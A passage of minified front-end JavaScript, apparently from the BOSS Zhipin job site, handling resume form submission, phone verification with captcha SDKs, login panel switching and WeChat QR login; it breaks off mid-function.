        $("input[name=birthday]").length && $("input[name=birthday]").is(":disabled") && (subData += "&birthday=" + $("input[name=birthday]").val()),
        $.ajax({
            type: "POST",
            url: url,
            dataType: "JSON",
            data: subData,
            success: function(result) {
                "string" == typeof result && (result = eval("(" + result + ")")),
                result.forceFace && (alert("您的账号当前处于不可使用状态，请登录BOSS直聘手机APP查看详情"),
                window.location.href = "/web/zppassport/logout"),
                1 == result.rescode ? (Guide.__conversion(ka),
                result.toUrl ? Guide.processSuccess(result.toUrl) : Guide.showNextForms(formWrap),
                result.encryptId && (formEl.find('input[name ="id"]').length ? formEl.find('input[name ="id"]') : formEl.find('input[name ="expectedJobId"]')).val(result.encryptId)) : Resume.showError(result.resmsg),
                btnEl.removeClass("btn-disabled").text(oldText).css("pointer-events", "auto")
            },
            error: function() {
                Resume.showError(),
                btnEl.removeClass("btn-disabled").text(oldText).css("pointer-events", "auto")
            }
        })
    },
    processSuccess: function(t) {
        $(window).off("beforeunload"),
        $.toast({
            content: "资料已完善",
            type: "success"
        }),
        -1 < window.location.href.indexOf("maxResumeCount") ? $.dialog({
            title: "提示",
            content: '<p>同时只能有3份附件文件，请前往附件管理删除一份后再上传</p><img src="https://img.bosszhipin.com/static/file/2022/9rghsb8r091671779041862.png" />',
            wrapClass: "max-resume-dialog",
            cancelText: "",
            confirmText: "我知道了",
            closeText: !0,
            onConfirm: function(e) {
                try {
                    _T.sendEvent("dialog_over")
                } catch (e) {}
                e.remove(),
                setTimeout(function() {
                    window.location.href = t
                }, 1e3)
            },
            onClose: function(e) {
                e.remove(),
                setTimeout(function() {
                    window.location.href = t
                }, 1e3)
            }
        }) : setTimeout(function() {
            window.location.href = t
        }, 1e3)
    },
    showSugSkillTag: function(e) {
        $.ajax({
            type: "GET",
            url: "/common/data/skill/recommendbyposition.json",
            dataType: "JSON",
            data: {
                position: e
            },
            success: function(e) {
                var i;
                1 == e.rescode && (i = "<ul>",
                $.each(e.data, function(e, t) {
                    i += "<li>" + t + "</li>"
                }),
                i += "</ul>",
                Guide.$workSkillTipsEl.html(i))
            },
            error: function() {}
        })
    }
})
  , UserCheck = ($(function() {
    Guide.init()
}),
{
    checkPhone: function(e, t, i, n, a, o) {
        var s = (s = (s = (s = (s = (s = (s = (s = (s = (s = (s = "") + ('<div class="sign-form check-phone"><form action="' + e + '" method="post">') + ('<div class="form-row"><span class="cell-title">当前登录账号</span><span>' + (a = a || (i ? i.replace(/(\d{3})\d{4}(\d{4})/, "$1****$2") : "***********")) + "</span></div>")) + (i ? '<input name="phone" value="' + i + '" type="hidden"/>' : "") + (n ? '<input name="regionCode" value="' + n + '" type="hidden"/>' : "")) + '<div class="form-row">' + '<span class="cell-title" style="vertical-align: top;line-height: 40px;">滑动完成验证</span><div class="row-code ipt-wrap" style="width: 324px; height: 42px;"></div>') + '<div class="verifyimg-error red"></div>' + "</div>") + '<div class="form-row row-sms">' + '<span class="cell-title">短信验证码</span>') + '<span class="ipt-wrap">' + '<i class="icon-sign-sms"></i><input type="text" class="ipt ipt-sms required" placeholder="短信验证码" name="phoneCode" maxlength="6" autocomplete="off"/>') + ('<input type="hidden" name="smsType" value="1" /><button type="button" class="btn btn-sms" data-url="' + (t = t || "/registe/sendSms.json") + '">获取验证码</button>') + '</span><div class="phonecode-error red"></div></div>') + '<div class="form-footer">' + '<div class="btns"><button class="btn btn-outline btn-cancel" type="button">取消</button><button class="btn btn-sure" type="submit">确定</button></div>') + "</div>" + '<input type="hidden" name="randomKey" class="randomkey" value=""/>') + (o && o.isWxLogin ? '<input type="hidden" name="isWxLogin" value="true"/>' : "") + "</form></div>";
        $.dialog({
            content: s,
            title: "请验证手机号",
            cancelButton: "取消",
            confirmButton: "确认",
            wrapClass: "dialog-prop-default check-phone-wrap",
            closeLayer: !o || !1 !== o.closeLayer,
            closeText: !o || !1 !== o.closeText,
            onOpen: function(t) {
                function e() {
                    "undefined" == typeof VerifyCodeSDK && i < 5 ? (i++,
                    n = setTimeout(e, 100)) : (i = null,
                    clearTimeout(n),
                    n = null,
                    new VerifyCodeSDK({
                        dom: t.find(".row-code")[0],
                        delayLoad: !0,
                        success: function(e) {
                            Sign.VerrifySuccessCallback(e)
                        },
                        ready: function(e) {
                            Sign.VerrifyReadyCallback(e)
                        },
                        fail: function(e) {
                            try {
                                t.find("input[name=phone]").val();
                                e && _T.sendTracking("verify_code_sdk_fail_" + JSON.stringify(e))
                            } catch (e) {}
                        }
                    }),
                    VerrifyCode.reset(t.find(".row-code")))
                }
                var i = 0
                  , n = null;
                e(),
                UserCheck.getRandomkey(t),
                t.find(".sign-form").data("flow", "sincodeck"),
                UserCheck.initEvent(t)
            }
        })
    },
    initEvent: function(t) {
        t.find("form").on("submit", function(e) {
            UserCheck.checkForm($(this)) && UserCheck.submitForm($(this), !1, t),
            e.preventDefault()
        }),
        t.find(".form-footer .btn-cancel").on("click", function() {
            t.find(".dialog-footer .btn-cancel").click()
        }),
        t.find(".btn-sms").on("click", function() {
            UserCheck.checkForm(t.find("form"), !0) && UserCheck.submitForm(t.find("form"), !0, t)
        }),
        t.find(".ipt").on("focus", function(e) {
            $(this).parent().addClass("focus-wrap")
        }).on("blur", function() {
            $(this).parent().removeClass("focus-wrap")
        }),
        t.find(".verifyimg").on("click", function() {
            $(this).attr("src", "/wapi/zppassport/captcha/?randomKey=" + $(this).closest(".form-row").find(".randomkey").val() + "&_r=" + (new Date).getTime());
            try {
                _T.sendEvent("signin_verify_code")
            } catch (e) {}
        })
    },
    checkForm: function(e, t) {
        var i = e.find("input[name=randKey]")
          , n = e.find(".ipt-sms");
        if (1 == VERRIFYCODETYPE ? i = e.find("input[name=challenge]") : 2 == VERRIFYCODETYPE ? i = e.find("input[name=csessionId]") : 4 == VERRIFYCODETYPE && (i = e.find("input[name=validate]")),
        !i.length || "" == i.val())
            return UserCheck.showError(e, $(".verifyimg-error"), "请先完成验证", !0),
            i.focus(),
            !1;
        if ($(".verifyimg-error").text(""),
        !t) {
            if ("" == n.val())
                return UserCheck.showError(e, $(".phonecode-error"), "请填写短信验证码", !0),
                n.focus(),
                !1;
            if (!n.val().match(/^.{4,6}$/))
                return UserCheck.showError(e, $(".phonecode-error"), "请填写正确的短信验证码", !0),
                n.focus(),
                !1;
            if (n.val().match(/\D+/))
                return UserCheck.showError(e, $(".phonecode-error"), "请填写正确的短信验证码", !0),
                n.val(""),
                n.focus(),
                !1;
            $(".phonecode-error").text("")
        }
        return !0
    },
    submitForm: function(n, a, o) {
        var s = n.find(".btn-sms")
          , r = n.find(".btn-sure")
          , e = a ? s.data("url") : n.attr("action");
        a || r.html("提交中...").addClass("btn-disabled"),
        $.ajax({
            url: e,
            type: "post",
            dataType: "json",
            data: n.serialize(),
            success: function(e) {
                e.zpData && (e.rescode = 0 == e.code ? 1 : 1 == e.code ? 0 : e.code,
                e.type = e.zpData.type,
                e.resmsg = e.message);
                var t, i = n.attr("action");
                if (1 != e.rescode && VerrifyCode.reset(n.find(".row-code")),
                a)
                    if (2 == e.type)
                        if (s.html('已发送(<em class="num">60s</em>)').addClass("count-down btn-disabled"),
                        UserCheck.countDown(s, function() {
                            s.html("发送验证码").removeClass("count-down btn-disabled")
                        }),
                        s.parent().find(".ipt-sms").focus(),
                        4 == e.errorType) {
                            UserCheck.showError(n, $(".phonecode-error"), "获取验证码过于频繁，请稍后再试", !0);
                            try {
                                _T.sendEvent("signin_sms_send_lot")
                            } catch (e) {}
                        } else
                            try {
                                _T.sendEvent("signin_sms_send_sms")
                            } catch (e) {}
                    else
                        UserCheck.showError(n, $(".phonecode-error"), e.resmsg, !0),
                        $.toast({
                            type: "error",
                            content: e.resmsg
                        }),
                        s.html("发送验证码").removeClass("count-down btn-disabled");
                else
                    setTimeout(function() {
                        r.html("确定").removeClass("btn-disabled")
                    }, 500),
                    "/login/phone.json" == i ? 1 == e.rescode ? (Sign.callbackSms(n, e),
                    o.remove()) : (o.remove(),
                    t = {
                        code: 0 == e.rescode ? 1 : 1 == e.rescode ? 0 : e.rescode,
                        message: e.resmsg,
                        zpData: e
                    },
                    Sign.dealSignFail($(".sign-pwd").find("form"), s, a, t)) : "/wechat/account/unbind.json" == i ? 1 == e.rescode ? (o.remove(),
                    $.toast({
                        type: "success",
                        content: "解绑成功"
                    }),
                    Account.elSideNav.find("li").eq(Account.convertTypeToIndex(5)).click()) : $.toast({
                        type: "error",
                        content: e.resmsg
                    }) : -1 < i.indexOf("/wapi/zppassport/login/phone") && (0 == e.code ? (Sign.callbackSms(n, e.zpData),
                    o.remove()) : (o.remove(),
                    Sign.dealSignFail($(".sign-pwd").find("form"), s, a, e)))
            },
            error: function() {
                $.toast({
                    type: "error",
                    content: "服务器异常"
                })
            }
        })
    },
    showError: function(e, t, i, n) {
        if (t.text(i),
        0 <= i.indexOf("短信验证码") && e.find(".ipt-sms").focus().val(""),
        n)
            try {
                _T.sendEvent(e.closest(".sign-form").data("flow") + "_error")
            } catch (e) {}
        $(window).width() < 800 && UserCheck.showToast(i)
    },
    countDown: function(e, t) {
        var i = parseInt(e.find(".num").text().replace("s"), 10);
        UserCheck.interCount = setInterval(function() {
            i--,
            e.find(".num").text(i + "s"),
            i <= 0 && (t(),
            clearInterval(UserCheck.interCount),
            UserCheck.interCount = null)
        }, 1e3)
    },
    showToast: function(e) {
        var t = $('<div class="toast"><p>' + e + "</p></div>");
        $(".toast").length && $(".toast").remove(),
        UserCheck.timerToast && clearTimeout(UserCheck.timerToast),
        $("body").append(t),
        $(".toast").show(),
        UserCheck.timerToast = setTimeout(function() {
            UserCheck.hideToast(t)
        }, 2e3)
    },
    hideToast: function() {
        $(".toast").fadeOut(function() {
            $(".toast").remove()
        })
    },
    getRandomkey: function(t) {
        var e = t.find(".ipt-code").attr("data-url");
        "" == t.find(".randomkey").val() && $.ajax({
            url: e,
            type: "POST",
            dataType: "json",
            data: {
                pk: $("#page_key_name").val()
            },
            success: function(e) {
                1 == e.rescode && (t.find(".randomkey").val(e.randomKey),
                t.find(".verifyimg").click())
            },
            error: function(e) {
                console.log(e)
            }
        })
    }
})
  , browser = {
    versions: function() {
        var e = navigator.userAgent;
        navigator.appVersion;
        return {
            trident: -1 < e.indexOf("Trident"),
            presto: -1 < e.indexOf("Presto"),
            webKit: -1 < e.indexOf("AppleWebKit"),
            gecko: -1 < e.indexOf("Gecko") && -1 == e.indexOf("KHTML"),
            mobile: !!e.match(/AppleWebKit.*Mobile.*/),
            ios: !!e.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),
            android: -1 < e.indexOf("Android") || -1 < e.indexOf("Adr"),
            iPhone: -1 < e.indexOf("iPhone"),
            iPad: -1 < e.indexOf("iPad"),
            webApp: -1 == e.indexOf("Safari"),
            weixin: -1 < e.indexOf("MicroMessenger"),
            qq: " qq" == e.match(/\sQQ/i)
        }
    }(),
    language: (navigator.browserLanguage || navigator.language).toLowerCase()
}
  , ka_pr = ""
  , LOGIN_SOURCE = ((browser.versions.mobile || browser.versions.android || browser.versions.ios) && (ka_pr = "wap_"),
getQueryString("from") || "")
  , LOGIN_SOURCE_URL = getQueryString("fromUrl") || ""
  , VERRIFYCODETYPE = 1
  , CODE_JIYAN_URL = "/wapi/zppassport/send/smsCodeV2"
  , LOGIN_JIYAN_URL = "/wapi/zppassport/login/phoneV2"
  , ACCOUNT_JIYAN_URL = "/wapi/zppassport/login/accountV2"
  , CODE_IMG_URL = "/wapi/zppassport/send/smsCodeV3"
  , LOGIN_IMG_URL = "/wapi/zppassport/login/phoneV3"
  , ACCOUNT_IMG_URL = "/wapi/zppassport/login/accountV3"
  , CODE_ALI_URL = "/wapi/zppassport/send/smsCode"
  , LOGIN_ALI_URL = "/wapi/zppassport/login/phone"
  , ACCOUNT_ALI_URL = "/wapi/zppassport/login/account"
  , CODE_NETEASY_URL = "/wapi/zppassport/send/smsCodeByWy"
  , LOGIN_NETEASY_URL = "/wapi/zppassport/login/phoneByWy"
  , ACCOUNT_NETEASY_URL = "/wapi/zppassport/login/accountByWy"
  , VerrifyCode = (seriesLoadScripts("https://static.zhipin.com/library/js/sdk/verify-sdk-v2.3.js", function() {
    Sign.VerrifySuccessCallback = function(e) {
        var t = $(e.el).parents("form");
        1 == e.type ? (e.challenge,
        e.validate,
        e.seccode,
        t.find('input[name="challenge"]').length || (t.append('<input type="hidden" name="challenge"></input>'),
        t.append('<input type="hidden" name="validate"></input>'),
        t.append('<input type="hidden" name="seccode"></input>')),
        t.find('input[name="challenge"]').val(e.challenge),
        t.find('input[name="validate"]').val(e.validate),
        t.find('input[name="seccode"]').val(e.seccode)) : 2 == e.type ? (t.find('input[name="csessionId"]').length || (t.append('<input type="hidden" name="csessionId"></input>'),
        t.append('<input type="hidden" name="csig"></input>'),
        t.append('<input type="hidden" name="ctoken"></input>')),
        t.find('input[name="csessionId"]').val(e.csessionId),
        t.find('input[name="csig"]').val(e.csig),
        t.find('input[name="ctoken"]').val(e.ctoken)) : 3 == e.type ? (t.find('input[name="randKey"]').length || (t.append('<input type="hidden" name="randKey"></input>'),
        t.append('<input type="hidden" name="captcha"></input>')),
        t.find('input[name="randKey"]').val(e.randKey)) : 4 == e.type && (t.find('input[name="validate"]').length || t.append('<input type="hidden" name="validate"></input>'),
        t.find('input[name="validate"]').val(e.validate)),
        3 != e.type && t.parents().hasClass("top-sign-box") && setTimeout(function() {
            QuickSign.checkForm(t.parents(".top-sign-box").find(".btn-sms").closest("form"), !0)
        }, 500)
    }
    ,
    Sign.VerrifyReadyCallback = function(e) {
        VERRIFYCODETYPE = e.type;
        var t = $(e.el).parents("form")
          , i = !1
          , n = $(e.el).parents(".sign-form");
        if ($.each(["sign-bind-wechat-signin", "sign-bind-wechat-signup"], function(e, t) {
            n.hasClass(t) && (i = !0)
        }),
        i)
            switch (parseInt(e.type)) {
            case 1:
                t.find(".btn-sms").attr("data-url", CODE_JIYAN_URL);
                break;
            case 2:
                t.find(".btn-sms").attr("data-url", CODE_ALI_URL);
                break;
            case 3:
                t.find(".btn-sms").attr("data-url", CODE_IMG_URL);
                break;
            case 4:
                t.find(".btn-sms").attr("data-url", CODE_NETEASY_URL);
                break;
            default:
                t.find(".btn-sms").attr("data-url", CODE_IMG_URL)
            }
        else
            1 == e.type ? t.find(".sign-tab .cur").hasClass("link-signin") ? t.attr("action", ACCOUNT_JIYAN_URL) : (t.attr("action", LOGIN_JIYAN_URL),
            t.find(".btn-sms").attr("data-url", CODE_JIYAN_URL)) : 2 == e.type ? t.find(".sign-tab .cur").hasClass("link-signin") ? t.attr("action", ACCOUNT_ALI_URL) : (t.attr("action", LOGIN_ALI_URL),
            t.find(".btn-sms").attr("data-url", CODE_ALI_URL)) : 3 == e.type ? t.find(".sign-tab .cur").hasClass("link-signin") ? t.attr("action", ACCOUNT_IMG_URL) : (t.attr("action", LOGIN_IMG_URL),
            t.find(".btn-sms").attr("data-url", CODE_IMG_URL)) : 4 == e.type && (t.find(".sign-tab .cur").hasClass("link-signin") ? t.attr("action", ACCOUNT_NETEASY_URL) : (t.attr("action", LOGIN_NETEASY_URL),
            t.find(".btn-sms").attr("data-url", CODE_NETEASY_URL)))
    }
    ,
    $(".top-sign-box").length || $(".search-job-list-wrap").find(".sign-quick").length || $(".job-box .sign-wrap-v2").find(".sign-quick").length || $(".sign-form:visible").find(".row-code").length && ($(".sign-form:visible").find(".row-code").html(""),
    new VerifyCodeSDK({
        dom: $(".sign-form:visible").find(".row-code")[0],
        success: function(e) {
            Sign.VerrifySuccessCallback(e)
        },
        ready: function(e) {
            Sign.VerrifyReadyCallback(e)
        },
        fail: function(e) {
            try {
                $(".sign-form:visible").find("input[name=phone]").val();
                e && _T.sendTracking("verify_code_sdk_fail_" + JSON.stringify(e))
            } catch (e) {}
        },
        delayLoad: !0
    }))
}),
{
    reset: function(e) {
        e = $(e).parents("form");
        e.find("input[name=csig]").val(""),
        e.find("input[name=ctoken]").val(""),
        e.find("input[name=csessionId]").val(""),
        e.find('input[name="challenge"]').val(""),
        e.find('input[name="validate"]').val(""),
        e.find('input[name="seccode"]').val(""),
        e.find('input[name="randKey"]').val("")
    }
})
  , filterXssStr = function(e) {
    return e && e.replace(/\</g, "&lt;").replace(/\>/g, "&gt;").replace("<phone>", "").replace("</phone>", "").replace("<copy>", "").replace("</copy>", "")
}
  , Sign = {
    xhrs: {},
    randomLoading: !1,
    tooLongCode: [400031, 400032, 400062, 400063, 400070, 400071, 4e3, 4002, 4003, 4009, 4022, 4040, 4512],
    loginLimitCode: [4563, 4567, 4912, 4918, 4930, 5004],
    secondScanTimer: null,
    enterLoginPageTime: 0,
    isNewUser: !1,
    realIdentity: 0,
    loginGray: !1,
    init: function(t) {
        Sign.addScanGuide(),
        t && void 0 !== PlaceholderCheck && PlaceholderCheck.init(),
        Sign.getCountryCode(),
        void 0 !== localStorageInstance && localStorageInstance("hasEnterJob", "");
        var e, i, n = t || $(".sign-wrap");
        if (Sign.source = getQueryString("s"),
        Sign.source && (Sign.directUrls = {
            recharge: "/html/payment/wx-recharge",
            actRecharge: "/special3SignUp/home?signUpId=" + getQueryString("signUpId"),
            wapSem: "/",
            url: getQueryString("jumpUrl") || "/"
        }),
        getQueryString("appId") && !n.find("input[name=appId]").length && (e = filterXssStr(getQueryString("appId")),
        n.find("form").append('<input type="hidden" name="appId" value="' + e + '" />')),
        n.find(".sign-scan .qrcode-box").length && (n.find(".scan-help-down li").eq(1).hide(),
        n.find(".scan-help-top li").eq(0).css({
            "border-top-left-radius": "20px",
            "border-bottom-left-radius": "20px"
        }),
        n.find(".scan-help-top li").eq(1).css({
            "border-top-right-radius": "20px",
            "border-bottom-right-radius": "20px"
        }),
        n.find(".sign-scan .qrcode-box p em, .sign-scan .qrcode-box .sign-scan-help").hover(function() {
            $(this).closest(".qrcode-box").children(".sign-scan-help").show().stop().animate({
                "margin-left": "0px",
                opacity: 1
            }, 200)
        }, function() {
            var e = $(this).closest(".qrcode-box").children(".sign-scan-help");
            e.stop().animate({
                "margin-left": "-10px",
                opacity: 0
            }, 200, function() {
                e.hide()
            })
        })),
        n.find(".sign-scan .scan-help-tab li").on("click", function() {
            var e = $(this).index();
            $(this).addClass("active").siblings().removeClass("active"),
            n.find(".scan-help-content li").eq(e).addClass("active").siblings().removeClass("active")
        }),
        n.find(".sign-tab").on("click", "span", function() {
            var e = $(this);
            e.hasClass("cur") || (e.hasClass("link-signin") && Sign.showPannel(n, "signin"),
            e.hasClass("link-sms") && Sign.showPannel(n, "sms"),
            e.hasClass("link-scan") && Sign.showPannel(n, "scan"))
        }),
        -1 < window.location.href.indexOf("dashboard/separateorders") && n.find(".sign-tab .link-scan").click(),
        n.find(".purpose-row").on("click", "span", function() {
            var e = $(this).index()
              , t = $(this).closest("form")
              , t = (t.find('input[name="purpose"]').val(e),
            t.closest(".sign-form").find(".sign-slide-box ul"));
            0 === e ? (t.filter(".geek-slide").removeClass("hide"),
            t.filter(".boss-slide").addClass("hide")) : 1 === e && (t.filter(".geek-slide").addClass("hide"),
            t.filter(".boss-slide").removeClass("hide")),
            $(this).addClass("cur").siblings().removeClass("cur"),
            $(this).parents(".sign-form").find(".row-code").html(""),
            new VerifyCodeSDK({
                dom: $(this).parents(".sign-form").find(".row-code")[0],
                success: function(e) {
                    Sign.VerrifySuccessCallback(e)
                },
                ready: function(e) {
                    Sign.VerrifyReadyCallback(e)
                },
                fail: function(e) {
                    try {
                        $(this).parents(".sign-form").find("input[name=phone]").val();
                        e && _T.sendTracking("verify_code_sdk_fail_" + JSON.stringify(e))
                    } catch (e) {}
                },
                delayLoad: !0
            })
        }),
        n.find(".text-tip .link-signup").on("click", function() {
            Sign.showPannel(n, "register")
        }),
        n.find(".text-tip .link-signin").on("click", function() {
            Sign.showPannel(n, "sms")
        }),
        n.find(".phone-switch").on("click", function() {
            Sign.showPannel(n, "register"),
            _T.sendEvent("signup_switch_phone")
        }),
        n.find(".ewm-switch").on("click", function() {
            Sign.showPannel(n, "miniapp"),
            _T.sendEvent("signup_switch_ewm")
        }),
        n.find(".text-tip .link-sms").on("click", function() {
            Sign.showPannel(n, "sms")
        }),
        n.find(".link-bind-wechat-signin").on("click", function() {
            Sign.showPannel(n, "bind-wechat-signin")
        }),
        n.find(".link-bind-wechat-signup").on("click", function() {
            Sign.showPannel(n, "bind-wechat-signup")
        }),
        Sign.dropSelect(n),
        n.find("form").on("submit", function(e) {
            Sign.checkForm($(this)),
            e.preventDefault()
        }),
        n.find(".btn-sms").on("click", function() {
            var e = $(this).closest("form");
            Sign.checkForm(e, !0)
        }),
        n.find(".ipt").on("focus", function(e) {
            $(this).parent().addClass("focus-wrap")
        }).on("blur", function() {
            $(this).parent().removeClass("focus-wrap")
        }),
        n.find(".ipt-phone").removeAttr("ka").on("click", function() {
            try {
                _T.sendEvent(ka_pr + $(this).closest(".sign-form").data("flow") + "_mobileck")
            } catch (e) {}
        }),
        n.find(".verifyimg").on("click", function() {
            $(this).attr("src", "/wapi/zppassport/captcha/?randomKey=" + $(this).closest(".form-row").find(".randomkey").val() + "&_r=" + (new Date).getTime());
            try {
                _T.sendEvent("signin_verify_code")
            } catch (e) {}
        }),
        n.find(".sign-form").each(function() {
            $(this).find("form").length && !$(this).find('form input[name="pk"]').length && (e = getQueryString("ka") || "",
            $(this).find("form").prepend('<input type="hidden" name="pk" value="' + (e || $("#page_key_name").val()) + '" />'));
            var e = "";
            if ($(this).hasClass("sign-pwd") && (e = "sincode"),
            $(this).hasClass("sign-sms") && (e = "sinsms"),
            $(this).hasClass("sign-scan") && (e = "sinqr"),
            $(this).hasClass("sign-register") && (e = "sup"),
            $(this).data("flow", ka_pr + e),
            $(this).is(":visible"))
                try {
                    _T.sendEvent(e + "_load")
                } catch (e) {}
            if ($(this).find(".randomkey").length && "" == $(this).find(".randomkey").val())
                return Sign.getRandomkey(n, $(this)),
                !1
        }),
        $(".invalid-box .btn").on("click", function() {
            var e = $(this).closest(".sign-form");
            e.find(".invalid-box").hide(),
            e.hasClass("sign-scan") ? (Sign.scanPending(t),
            Sign.scanValid()) : (Sign.checkIsScanned(e),
            Sign.RegScanValid(e))
        }),
        $(".sign-scan").is(":visible")) {
            $(".sign-scan").find(".qrcodeimg-box img").attr("src") || (e = "/wflow/zpweixin/qrcode/getqrcode?content=" + $(".sign-scan .uuid").val() + "&w=200&h=200",
            $(".sign-scan .qrcodeimg-box img").attr("src", e));
            try {
                _T.sendTracking("sign_scan_start_uuid_" + $(".sign-scan .uuid").val())
            } catch (e) {}
            Sign.scanPending(n),
            Sign.scanValid()
        }
        $(".sign-miniapp").is(":visible") && ($(".sign-miniapp").find(".qrcodeimg-box img").attr("src") || $(".sign-miniapp .qrcodeimg-box img").attr("src", "/wflow/zpgeek/miniapp/" + $(".sign-miniapp .scene").val()),
        Sign.checkIsScanned($(".sign-miniapp")),
        Sign.RegScanValid($(".sign-miniapp"))),
        cookie.get("hasShowLoginTip") ? n.find(".qrcode-tip").hide() : n.find(".qrcode-tip").show(),
        n.find(".qrcode-tip .gray").on("click", function() {
            n.find(".qrcode-tip").hide(),
            cookie.set("hasShowLoginTip", "1", 3e4)
        }),
        Sign.initMiniApp(n),
        $(window).width() <= 800 && $(".sign-pwd").is(":visible") && $(".sign-tab .link-sms").trigger("click"),
        $(window).width() <= 800 && $(".sign-scan").is(":visible") && Sign.showPannel($(".page-sign .sign-wrap"), "sms"),
        $(window).resize(__throttle(function() {
            $(window).width() <= 800 && $(".sign-pwd").is(":visible") && $(".sign-tab .link-sms").trigger("click"),
            $(window).width() <= 800 && $(".sign-scan").is(":visible") && Sign.showPannel($(".page-sign .sign-wrap"), "sms")
        }, 200)),
        i = .5 <= Math.random() ? "(010)57596212，(010)65090445" : "(010)65090445，(010)57596212",
        $(".publicity-info .renshe-phone").html("朝阳区人社局监督电话").one("click", function() {
            $(this).html("朝阳区人社局监督电话：" + i)
        }),
        "creator" == LOGIN_SOURCE && $(".text-tip").remove(),
        "sao" == getQueryString("loginWay") && n.find(".link-scan").click(),
        window.BossZhipinBridge && $(".sign-slide-box .logo").on("click", function() {
            return !1
        }),
        1 == getQueryString("loginType") && ($(".sign-pwd .text-tip").addClass("float-none"),
        $(".sign-sms .text-tip").addClass("float-none")),
        $(".page-sign").length && (Sign.enterLoginPageTime = (new Date).getTime(),
        Sign.getLoginGray())
    },
    getCountryCode: function() {
        $(".row-select .dropdown-menu").find("ul").html('<li data-val="+86"><span class="num">+86</span>中国大陆</li><li class="no-mainland-china">非中国大陆手机号</li>')
    },
    getLoginGray: function() {
        $.get("/wapi/zppassport/user/getLoginGray", {
            environment: "BossLoginIndex"
        }, function(e) {
            0 == e.code && e.zpData && (Sign.loginGray = e.zpData.loginGray)
        })
    },
    setWxUrlRandomParam: function(e) {
        return e.indexOf("?") < 0 ? e + "?random=" + (new Date).getTime() : e + "&random=" + (new Date).getTime()
    },
    initWechatBind: function(e) {
        "undefined" != typeof wxBindData && seriesLoadScripts("https://res.wx.qq.com/connect/zh_CN/htmledition/js/wxLogin.js", function() {
            var i = "https://www.zhipin.com/web/user/login-callback";
            -1 < window.location.host.indexOf("weizhipin.com") && (i = window.location.origin + "/web/user/login-callback"),
            e.find(".link-wechat-login").on("click", function() {
                $.dialog({
                    title: "",
                    content: '<div class="wechat-login-dialog-layer"></div><div class="wechat-login-wrap"><div id="wechat-login"></div><div class="overdue"><span>二维码已过期</span><button class="btn btn-refresh">点击刷新</button></div></div>',
                    closeText: !0,
                    confirmText: !1,
                    cancelText: !1,
                    wrapClass: "dialog-layer-full dialog-wechat-login",
                    onOpen: function(e) {
                        new WxLogin({
                            id: "wechat-login",
                            appid: wxBindData.appid || "wxf68ac2d384a75d96",
                            scope: wxBindData.scope,
                            redirect_uri: i,
                            state: wxBindData.state,
                            style: "white",
                            href: window.location.origin + "/v2/web/geek/css/wechat-scan.css"
                        });
                        var t = $(".wechat-login-wrap .overdue");
                        setTimeout(function() {
                            t.is(":visible") || t.show()
                        }, 6e4),
                        t.find(".btn-refresh").on("click", function() {
                            setTimeout(function() {
                                t.is(":visible") || t.show()
                            }, 6e4),
                            t.hide();
                            new WxLogin({
                                id: "wechat-login",
                                appid: wxBindData.appid,
                                scope: wxBindData.scope,
                                redirect_uri: i,
                                state: wxBindData.state,
                                style: "white",
                                href: window.location.origin + "/v2/web/geek/css/wechat-scan.css"
                            })
                        }),
                        $(".wechat-login-dialog-layer").on("click", function() {
                            e.remove()
                        })
                    },
                    onConfirm: function(e) {
                        e.remove()
                    },
                    onClose: function(e) {
                        try {
                            _T.sendEvent("wx_qr_off")
                        } catch (e) {}
                    }
                })
            })
        })
    },
    initMiniApp: function(e) {
        e.find(".link-wechat-login").on("click", function() {
            $.dialog({
                title: "",
                content: ['<div class="wechat-login-dialog-layer"></div>', '<div class="wechat-login-wrap"><div class="title">微信登录</div>', '<div class="mini-app-login"><img class="mini-qrcode" /></div>', '<div class="info"><p>请使用微信扫描二维码登录</p></p>“BOSS直聘”</p></div>', '<div class="overdue mini-overdue"><span>二维码已过期</span><button class="btn btn-refresh">点击刷新</button></div></div>'].join(" "),
                closeText: !0,
                confirmText: !1,
                cancelText: !1,
                wrapClass: "dialog-layer-full dialog-wechat-login",
                onOpen: function(e) {
                    Sign.refreshMiniApp(e);
                    var t = $(".wechat-login-wrap .overdue");
                    Sign.miniAppExpireTimer = setTimeout(function() {
                        t.is(":visible") || t.show(),
                        Sign.clearMiniExpire()
                    }, 18e4),
                    t.find(".btn-refresh").on("click", function() {
                        Sign.miniAppExpireTimer = setTimeout(function() {
                            t.is(":visible") || t.show(),
                            Sign.clearMiniExpire()
                        }, 18e4),
                        t.hide(),
                        Sign.refreshMiniApp(e)
                    }),
                    $(".wechat-login-dialog-layer").on("click", function() {
                        e.remove(),
                        Sign.clearMiniExpire()
                    })
                },
                onClose: function() {
                    Sign.clearMiniExpire()
                }
            })
        })
    },
    clearMiniExpire: function() {
        Sign.miniAppExpireTimer && clearTimeout(Sign.miniAppExpireTimer),
        Sign.miniAppExpireTimer = null,
        Sign.miniAppExpired = !0
    },
    refreshMiniApp: function(i) {
        Sign.miniAppExpired = !1;
        $.ajax({
            url: "/wapi/zppassport/captcha/randkey",
            type: "POST",
            dataType: "json",
            data: {
                pk: $("#page_key_name").val()
            },
            success: function(e) {
                var t = e.zpData || {};
                0 == e.code && $.ajax({
                    type: "get",
                    dataType: "json",
                    data: {
                        uuid: t.shortRandKey,
                        width: 280
                    },
                    url: "/wapi/zppassport/qrcode/getMpCode",
                    success: function(e) {
                        0 == e.code && (e = e.zpData || {},
                        i.find(".mini-app-login img").attr("src", e.mpCodeUrl),
                        Sign.checkMiniScanned(i, t.shortRandKey))
                    }
                })
            }
        })
    },
    showPannel: function(t, e) {
        var i, n;
        switch (t.find(".sign-form").hide(),
        e) {
        case "signin":
            i = t.find(".sign-pwd"),
            n = "sincodeck";
            break;
        case "sms":
            i = t.find(".sign-sms"),
            n = "sinsmsck";
            break;
        case "scan":
            i = t.find(".sign-scan"),
            n = "sinqrck";
            break;
        case "register":
            i = t.find(".sign-register"),
            n = "supck";
            break;
        case "welcome":
            i = t.find(".sign-welcome");
            break;
        case "history":
            i = t.find(".sign-history");
            break;
        case "deliver":
            i = t.find(".sign-deliver");
            break;
        case "validate":
            i = t.find(".sign-validate");
            break;
        case "miniapp":
            i = t.find(".sign-miniapp");
            break;
        case "bind-wechat-signin":
            i = t.find(".sign-bind-wechat-signin");
            break;
        case "bind-wechat-signup":
            i = t.find(".sign-bind-wechat-signup")
        }
        if (n) {
            i.data("flow", n);
            try {
                _T.sendEvent(ka_pr + n + "_load")
            } catch (e) {}
        }
        Sign.timer && clearTimeout(Sign.timer),
        i.show(),
        i.find(".verifyimg").click(),
